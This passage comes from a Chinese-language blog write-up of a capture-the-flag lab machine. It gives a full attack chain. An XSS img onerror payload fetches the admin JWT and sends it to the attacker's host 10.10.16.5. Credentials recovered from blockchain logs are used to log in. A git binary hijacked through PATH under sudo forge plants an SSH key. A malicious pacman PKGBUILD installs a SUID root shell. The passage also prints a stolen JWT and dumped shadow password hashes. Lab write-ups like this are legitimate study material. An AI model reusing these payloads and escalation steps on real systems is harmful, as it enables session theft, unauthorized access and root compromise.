+<p><img alt="image-20241125100801475.png" loading="lazy" decoding="async" width="1873" height="689" src="/_astro/image-20241125100801475.C1b3-anY_ZgMfDW.webp" srcset=""></p>
+<p>Payload</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#54B9FF">img</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#4BF3C8;--shiki-dark-font-style:italic"> src</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FFFFFF;--shiki-dark-font-style:inherit">=x</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#4BF3C8;--shiki-dark-font-style:italic"> onerror</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FFFFFF;--shiki-dark-font-style:inherit">=fetch("http://10.10.16.5/xss")&gt;</span></span></code></pre>
+<p><img alt="image-20241126094717680.png" loading="lazy" decoding="async" width="1671" height="489" src="/_astro/image-20241126094717680.DHZRkSVS_Z1x9H2i.webp" srcset=""></p>
+<p>这里直接读取 Cookie 会失败，HTTP 服务器这边没有看到请求。</p>
+<p><img alt="image-20241126094801731.png" loading="lazy" decoding="async" width="978" height="553" src="/_astro/image-20241126094801731.BhyRfqQX_29IVDW.webp" srcset=""></p>
+<p>同时在 Burp 中发现会不间断请求 <code>api/info</code> 来返回 jwt_token，因此使用 js 获取此请求响应。将响应内容作为参数请求到 HTTP 服务器中，达成 XSS + CSRF。</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">fetch</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'http://10.10.11.43/api/info'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">	.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">then</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#E36209;--shiki-light-font-style:inherit;--shiki-dark:#4BF3C8;--shiki-dark-font-style:italic">resp</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> =&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> { </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">return</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> resp</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">text</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">()})</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">	.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">then</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#E36209;--shiki-light-font-style:inherit;--shiki-dark:#4BF3C8;--shiki-dark-font-style:italic">jwt</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> =&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> {</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">fetch</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">`http://10.10.16.5/xss?c=</span><span style="--shiki-light:#032F62;--shiki-dark:#54B9FF">${</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">jwt</span><span style="--shiki-light:#032F62;--shiki-dark:#54B9FF">}</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">`</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)})</span></span></code></pre>
+<p>整理到 img 标签</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#54B9FF">img</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#4BF3C8;--shiki-dark-font-style:italic"> src</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FFFFFF;--shiki-dark-font-style:inherit">=x</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#4BF3C8;--shiki-dark-font-style:italic"> onerror</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"fetch('http://10.10.11.43/api/info').then(resp=&gt;resp.text()).then(jwt=&gt;fetch(`http://10.10.16.5/x?c=${jwt}`))"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&gt;</span></span></code></pre>
+<p><img alt="image-20241126100209001.png" loading="lazy" decoding="async" width="1708" height="494" src="/_astro/image-20241126100209001.WDkF3AGA_E1So3.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjU4NTY5NCwianRpIjoiMTgwYjIzN2EtMWJmNy00OGJkLTliNTUtNjFlZTU1NTQwZjhjIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMyNTg1Njk0LCJleHAiOjE3MzMxOTA0OTR9.DdjDt7AMqENkjwxR7Ty6N2IQLVKaynSjiFx_oD0kOA4</span></span></code></pre>
+<p>拿到了管理员的 jwt，查看管理员页面</p>
+<p><img alt="image-20241126100309193.png" loading="lazy" decoding="async" width="1032" height="523" src="/_astro/image-20241126100309193.C8OHPvu2_Z1VHgty.webp" srcset=""></p>
+<p><img alt="image-20241126100437633.png" loading="lazy" decoding="async" width="1073" height="483" src="/_astro/image-20241126100437633.CkBbYYz__Z1SSSbh.webp" srcset=""></p>
+<p><img alt="image-20241126100446115.png" loading="lazy" decoding="async" width="860" height="388" src="/_astro/image-20241126100446115.DJ4X-261_2dXuBo.webp" srcset=""></p>
+<p><img alt="image-20241126100454617.png" loading="lazy" decoding="async" width="930" height="420" src="/_astro/image-20241126100454617.YOgdbQw8_Sor9a.webp" srcset=""></p>
+<p>在管理员界面看到了之前发送的消息 <code>good</code>，以及另一个用户 keira。</p>
+<p><img alt="image-20241126100527006.png" loading="lazy" decoding="async" width="1021" height="601" src="/_astro/image-20241126100527006.BApDtWzG_Hl44R.webp" srcset=""></p>
+<p><img alt="image-20241126100551954.png" loading="lazy" decoding="async" width="1067" height="517" src="/_astro/image-20241126100551954.wV3o1P-5_1V1uv9.webp" srcset=""></p>
+<p><img alt="image-20241126100600348.png" loading="lazy" decoding="async" width="1013" height="769" src="/_astro/image-20241126100600348.rf0xDxBo_dE2o7.webp" srcset=""></p>
+<p>在 burpsuite 看到了几个 API 接口的调用记录，与之前 8545 端口的以太坊协议调用类似。结合接口名称 <code>chat_address</code> 大致可以猜到是一个基于区块链的聊天室，可以看一下区块链上的信息。</p>
+<blockquote>
+<p><a href="https://docs.alchemy.com/reference/ethereum-api-endpoints">https://docs.alchemy.com/reference/ethereum-api-endpoints</a></p>
+</blockquote>
+<p>首先获取 token</p>
+<p><img alt="image-20241126114338578.png" loading="lazy" decoding="async" width="1226" height="384" src="/_astro/image-20241126114338578.BJCu4NtV_Z1bqaE1.webp" srcset=""></p>
+<p>然后查看链上的 Log</p>
+<p><img alt="image-20241126114424601.png" loading="lazy" decoding="async" width="1461" height="1064" src="/_astro/image-20241126114424601.Qm5-hXcX_2ngykg.webp" srcset=""></p>
+<p>把所有的 data 部分拿出来，然后尝试十六进制转字符串</p>
+<p><img alt="image-20241126114722029.png" loading="lazy" decoding="async" width="1728" height="180" src="/_astro/image-20241126114722029.R7_SFOgB_Z1wCPhz.webp" srcset=""></p>
+<p><img alt="image-20241126114753160.png" loading="lazy" decoding="async" width="1981" height="892" src="/_astro/image-20241126114753160.G_GtO40J_1hcCkR.webp" srcset=""></p>
+<p>发现了两个用户，以及之前发送的消息，第一个块 0x0 是 keria 用户，那么调用 get_BlockByNumber 查看</p>
+<p><img alt="image-20241126123726800.png" loading="lazy" decoding="async" width="1550" height="798" src="/_astro/image-20241126123726800.AlfatR5B_19QgHK.webp" srcset=""></p>
+<p><img alt="image-20241126123744431.png" loading="lazy" decoding="async" width="1573" height="860" src="/_astro/image-20241126123744431.nZvTEXFj_Z1MgYrb.webp" srcset=""></p>
+<p>在 0x0 块没发现什么信息，在 0x1 块发现了 input 内容，是一串十六进制数据，解密：</p>
+<p><img alt="image-20241126123948081.png" loading="lazy" decoding="async" width="1173" height="1365" src="/_astro/image-20241126123948081.DuzIFhNA_kfPB9.webp" srcset=""></p>
+<p>有点像是凭据，尝试登录 <code>keira:SomedayBitCoinWillCollapse</code></p>
+<p><img alt="image-20241126124052539.png" loading="lazy" decoding="async" width="1170" height="574" src="/_astro/image-20241126124052539.DBHHvurD_KeBEq.webp" srcset=""></p>
+<h3 id="local-enum">Local Enum</h3>
+<p><img alt="image-20241126124128292.png" loading="lazy" decoding="async" width="751" height="149" src="/_astro/image-20241126124128292.B1KMraTW_ZkIbfH.webp" srcset=""></p>
+<p>发现可以以 paul 用户权限调用 forge</p>
+<p><img alt="image-20241126124252326.png" loading="lazy" decoding="async" width="1226" height="1052" src="/_astro/image-20241126124252326.BuYIPImM_ZMpizw.webp" srcset=""></p>
+<p>是一个 Solidity 项目管理工具</p>
+<h2 id="shell-as-paul">Shell as Paul</h2>
+<blockquote>
+<p><a href="http://book.getfoundry.sh/reference/forge/forge.html">http://book.getfoundry.sh/reference/forge/forge.html</a></p>
+</blockquote>
+<p>这里给出了官方文档。一般项目管理工具在对项目进行创建、构建、运行、清理的时候都可以加载自定义脚本，因此可以找一个开源的配置文件进行修改，首先创建一个项目</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>sudo -u paul /home/paul/.foundry/bin/forge init /tmp/test1</span></span></code></pre>
+<p><img alt="image-20241126232330612.png" loading="lazy" decoding="async" width="1684" height="445" src="/_astro/image-20241126232330612.tAe926uc_Z1wRxKr.webp" srcset=""></p>
+<p>这里发现初始化项目的时候还会调用 git，同时 sudo -l 也没有对环境变量进行重置，因此可以劫持 git</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>cd /tmp; ssh-keygen -t rsa -q -P "" -f ~/.ssh/id_rsa; echo '#!/bin/bash' &gt; /tmp/git; echo "mkdir ~/.ssh" &gt;&gt; /tmp/git; echo "echo `cat ~/.ssh/id_rsa.pub` &gt;&gt; ~/.ssh/authorized_keys" &gt;&gt; /tmp/git; chmod +x /tmp/git; export PATH=/tmp:$PATH; sudo -u paul /home/paul/.foundry/bin/forge init /tmp/test</span></span>
+<span class="line"><span>ssh paul@127.0.0.1</span></span></code></pre>
+<p><img alt="image-20241126232605439.png" loading="lazy" decoding="async" width="946" height="253" src="/_astro/image-20241126232605439.CAMAo_jw_ZH7vc7.webp" srcset=""></p>
+<h2 id="shell-as-root">Shell as Root</h2>
+<p>有 pacman 的 sudo 权限，可以先打包一个恶意的 pacman 安装包，在安装过程中执行命令。</p>
+<blockquote>
+<p><a href="https://www.ovios.org/pkgbuild-example">https://www.ovios.org/pkgbuild-example</a></p>
+</blockquote>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>sudo pacman -R pwned --noconfirm</span></span>
+<span class="line"><span>cd; rm -rf /tmp/good; mkdir /tmp/good; cd /tmp/good</span></span>
+<span class="line"><span>cat &lt;&lt; EOF &gt; PKGBUILD</span></span>
+<span class="line"><span>pkgname=pwned</span></span>
+<span class="line"><span>pkgver=1.2</span></span>
+<span class="line"><span>pkgrel=3</span></span>
+<span class="line"><span>arch=(x86_64)</span></span>
+<span class="line"><span>package() {</span></span>
+<span class="line"><span>	bash</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span>EOF</span></span>
+<span class="line"><span>makepkg -s</span></span>
+<span class="line"><span>sudo pacman -U pwned-1.2-3-x86_64.pkg.tar.zst --noconfirm</span></span></code></pre>
+<p><img alt="image-20241127002126620.png" loading="lazy" decoding="async" width="1021" height="647" src="/_astro/image-20241127002126620.Dt_1Wjln_YlUYj.webp" srcset=""></p>
+<p>这里虽然提示符变成了 # 号，但是并没有权限，一个假的 Root</p>
+<p><img alt="image-20241127004233872.png" loading="lazy" decoding="async" width="1035" height="265" src="/_astro/image-20241127004233872.Bp8Z2A6F_1kh6SK.webp" srcset=""></p>
+<p>这样在构建的时候会把目标文件安装到 pkg 命名空间下</p>
+<p><img alt="image-20241127004548511.png" loading="lazy" decoding="async" width="1182" height="771" src="/_astro/image-20241127004548511.DTQue35R_20a6Fs.webp" srcset=""></p>
+<p>所以使用的时候需要调用环境变量 $pkgdir</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>cat &lt;&lt; EOF &gt; PKGBUILD</span></span>
+<span class="line"><span>pkgname=pwned</span></span>
+<span class="line"><span>pkgver=1.2</span></span>
+<span class="line"><span>pkgrel=3</span></span>
+<span class="line"><span>arch=(x86_64)</span></span>
+<span class="line"><span>package() {</span></span>
+<span class="line"><span>	cp /bin/bash \$pkgdir/shell</span></span>
+<span class="line"><span>	chmod 4777 \$pkgdir/shell</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span>EOF</span></span>
+<span class="line"><span>makepkg -si --noconfirm</span></span></code></pre>
+<p><img alt="image-20241127004857048.png" loading="lazy" decoding="async" width="1389" height="941" src="/_astro/image-20241127004857048.l0Uh-eyr_nTIVP.webp" srcset=""></p>
+<p>可以看到这个 Bash 已经具有 Suid 权限了</p>
+<p><img alt="image-20241127004957624.png" loading="lazy" decoding="async" width="867" height="368" src="/_astro/image-20241127004957624.f7iBR5zF_1mxbUJ.webp" srcset=""></p>
+<h2 id="more">More</h2>
+<h3 id="dump-hash">Dump Hash</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>root:$y$j9T$aS1WjBeHOMsj5JDGpOSTR0$eEn9e2kIqFfcRCf79xQw7iLDJbt/ioE793tqS3GnjsC:19878::::::</span></span>
+<span class="line"><span>bin:!*:19878::::::</span></span>
+<span class="line"><span>daemon:!*:19878::::::</span></span>
+<span class="line"><span>mail:!*:19878::::::</span></span>
+<span class="line"><span>ftp:!*:19878::::::</span></span>
+<span class="line"><span>http:!*:19878::::::</span></span>
+<span class="line"><span>nobody:!*:19878::::::</span></span>
+<span class="line"><span>dbus:!*:19878::::::</span></span>
+<span class="line"><span>systemd-coredump:!*:19878::::::</span></span>
+<span class="line"><span>systemd-network:!*:19878::::::</span></span>
+<span class="line"><span>systemd-oom:!*:19878::::::</span></span>
+<span class="line"><span>systemd-journal-remote:!*:19878::::::</span></span>
+<span class="line"><span>systemd-resolve:!*:19878::::::</span></span>
+<span class="line"><span>systemd-timesync:!*:19878::::::</span></span>
+<span class="line"><span>tss:!*:19878::::::</span></span>
+<span class="line"><span>uuidd:!*:19878::::::</span></span>
+<span class="line"><span>polkitd:!*:19878::::::</span></span>
+<span class="line"><span>avahi:!*:19878::::::</span></span>
+<span class="line"><span>git:!*:19878::::::</span></span>
+<span class="line"><span>keira:$y$j9T$XXkQ9ogGKlThyrI.mItx80$eMiwlviC0FB/bu5tWtoc.DpedzwUnOwETzmlPf6ZuC8:19878:0:99999:7:::</span></span>
+<span class="line"><span>paul:$y$j9T$milm8la5tGGIhUazNYV3k.$lsAle1Ny3lNaIzStej/8qsKj/1wSgaoi15f/u5Ky/h9:19878:0:99999:7:::</span></span>
+<span class="line"><span>dhcpcd:!*:20020::::::</span></span>
+<span class="line"><span>_laurel:!:20038::::::</span></span></code></pre>
+<h3 id="提权脚本">提权脚本</h3>
+<blockquote>
+<p>来自 <a href="https://manesec.github.io/2024/11/23/2024-htb-machine/47-BlockBlock/">manesec</a> 的提权脚本</p>
+</blockquote>
+<ul>
+<li>Paul</li>
+</ul>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>cd /tmp</span></span>
+<span class="line"><span>ssh-keygen -t rsa -b 4096 -C "mane@manesec.com" -f ./key</span></span>
+<span class="line"><span>sudo -u paul /home/paul/.foundry/bin/forge flatten /tmp/key.pub -o /home/paul/.ssh/authorized_keys</span></span>
+<span class="line"><span>ssh -i key paul@127.0.0.1</span></span></code></pre>
+<ul>
+<li>root</li>
+</ul>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>cd ~</span></span>
+<span class="line"><span>rm -rf mane</span></span>
+<span class="line"><span>mkdir mane</span></span>
+<span class="line"><span>cd mane </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>sudo pacman -R mane --noconfirm</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>cat &lt;&lt; EOF &gt; PKGBUILD</span></span>
+<span class="line"><span>pkgname=mane</span></span>
+<span class="line"><span>pkgver=1.0.2</span></span>
+<span class="line"><span>pkgrel=1</span></span>
+<span class="line"><span>pkgdesc="sleep is good"</span></span>
+<span class="line"><span>arch=('any')</span></span>
+<span class="line"><span>url="http://example.com"</span></span>
+<span class="line"><span>license=('GPL')</span></span>
+<span class="line"><span>depends=()</span></span>
+<span class="line"><span>makedepends=()</span></span>
+<span class="line"><span>source=()</span></span>
+<span class="line"><span>sha256sums=()</span></span>
+<span class="line"><span>package() {</span></span>
+<span class="line"><span>    install -Dm4777 -o root -g root "/bin/bash" "\$pkgdir/manesec"</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span>EOF</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>makepkg -s</span></span>
+<span class="line"><span>sudo pacman -U mane-1.0.2-1-any.pkg.tar.zst --noconfirm</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>/manesec -p </span></span></code></pre>
+</div></article></main><footer data-astro-cid-jo6i4kqk><div class="inner" data-astro-cid-jo6i4kqk><p class="line" data-astro-cid-jo6i4kqk>© 2026 Zumpyx</p><p class="note" data-astro-cid-jo6i4kqk>notes · exploit · write · repeat</p></div></footer></body></html>
